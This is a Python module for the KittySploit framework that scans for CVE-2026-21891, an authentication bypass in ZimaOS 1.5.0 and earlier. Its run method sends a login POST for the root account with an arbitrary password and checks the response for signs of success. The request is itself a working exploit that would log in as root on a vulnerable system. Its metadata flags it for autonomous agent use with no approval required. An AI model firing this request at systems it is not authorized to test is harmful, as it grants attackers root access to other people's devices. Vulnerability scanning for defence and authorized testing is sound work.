#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""ZimaOS - Authentication Bypass"""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        "name": "ZimaOS - Authentication Bypass",
        "description": (
            "ZimaOS <= 1.5.0 accepts any password for known system service accounts "
            "such as root via /v1/users/login."
        ),
        "author": ["KittySploit Team"],
        "severity": "critical",
        "cve": "CVE-2026-21891",
        "tags": [
            "web", "scanner", "cve", "cve2026", "vuln",
            "zimaos", "auth-bypass", "vkev",
        ],
        "agent": {
            "risk": "active",
            "effects": ["network_probe"],
            "expected_requests": 1,
            "reversible": True,
            "approval_required": False,
            "produces": ["tech_hints", "risk_signals", "endpoints"],
            "cost": 1.0,
            "noise": 0.2,
            "value": 1.0,
        },
        "references": [
            "https://github.com/IceWhaleTech/ZimaOS/security/advisories/GHSA-xj93-qw9p-jxq4",
            "https://nvd.nist.gov/vuln/detail/CVE-2026-21891",
        ],
    }

    def run(self):
        r = self.http_request(
            method="POST",
            path="/v1/users/login",
            headers={
                "Content-Type": "application/json",
                "Accept": "application/json, text/plain, */*",
            },
            data='{"username":"root","password":"anything"}',
            allow_redirects=False,
        )
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        ctype = (r.headers.get("Content-Type") or r.headers.get("content-type") or "").lower()
        if "application/json" not in ctype:
            return False
        if not all(m in body for m in ("success", "username", "created_at")):
            return False
        self.set_info(
            severity="critical",
            cve="CVE-2026-21891",
            reason="ZimaOS accepted arbitrary password for root via /v1/users/login",
            path="/v1/users/login",
            confidence="high",
        )
        return True
